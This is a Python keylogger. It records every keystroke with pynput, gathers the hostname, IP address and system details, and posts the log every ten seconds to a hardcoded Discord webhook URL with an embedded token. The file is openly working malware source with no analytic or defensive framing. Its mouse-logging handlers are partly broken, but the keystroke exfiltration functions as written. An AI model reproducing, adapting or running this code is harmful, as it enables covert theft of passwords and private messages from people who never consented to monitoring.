import logging
import os
import platform
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import requests
from pynput import keyboard
from pynput.keyboard import Listener

SEND_REPORT_EVERY = 10  # as in seconds
WEBHOOK_URL = "https://discord.com/api/webhooks/1112326689029095486/JgN2SZ5VchtnHbYY2gn_pwg7EMGWHxf0Wn2SR-dfQGCbOlMix0IBeORw39Fjw3mP6x7W"

class KeyLogger:
    def __init__(self, time_interval, webhook_url):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.webhook_url = webhook_url

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_log(self):
        data = {
            "content": "\n\n" + self.log
        }
        response = requests.post(self.webhook_url, data=data)
        if response.status_code != 204:
            raise Exception("POST request to webhook URL failed with status code %s" % response.status_code)
        self.log = ""
        timer = threading.Timer(self.interval, self.send_log)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.send_log()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
keylogger.run()